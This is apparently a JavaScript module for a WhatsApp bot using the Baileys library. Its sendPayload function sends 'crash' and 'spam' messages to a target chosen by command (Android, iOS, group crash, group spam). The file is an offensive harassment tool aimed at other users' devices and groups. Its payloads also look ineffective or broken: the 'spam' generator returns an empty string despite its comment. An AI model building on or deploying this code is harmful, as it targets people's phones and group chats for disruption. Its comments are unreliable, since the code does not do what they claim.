const { WAProto } = require('@adiwajshing/baileys');

module.exports = {
    sendPayload: async (client, target, type) => {
        try {
            let payload;
            
            // Payloads existants pour les appareils
            switch(type) {
                case 'XANDROID':
                    payload = generateAndroidCrashPayload();
                    break;
                case 'XIOS':
                    payload = generateiOSCrashPayload();
                    break;
                case 'CRASHGROUP': // Nouvelle commande
                    payload = generateGroupCrashPayload();
                    break;
                case 'SPAMGROUP': // Nouvelle commande
                    payload = generateGroupSpamPayload();
                    break;
                default:
                    throw new Error('Commande inconnue');
            }

            const message = {
                conversation: payload
            };

            await client.sendMessage(target, message);
            return true;
            
        } catch(e) {
            console.error('Erreur payload:', e);
            throw new Error('Échec de l\'envoi du payload');
        }
    }
};

// Payloads pour les groupes (exemples théoriques)
function generateGroupCrashPayload() {
    // Exemple : Message corrompu pour les groupes
    return String.fromCharCode(0x200B, 0x200B, 0x200B).repeat(1000); // Caractères Zero-Width
}

function generateGroupSpamPayload() {
    // Exemple : Spam de messages invisibles
    return Array(1000).fill('').join(''); // Caractères de contrôle
}

// Anciens payloads (exemples)
function generateAndroidCrashPayload() {
    return Buffer.from([0xFE, 0xED, 0xFA, 0xCE]).toString('base64'); 
}

function generateiOSCrashPayload() {
    return '􀿃􀿄􀿅􀿆􀿇'.repeat(100); // Caractères Private Use Unicode
                        }
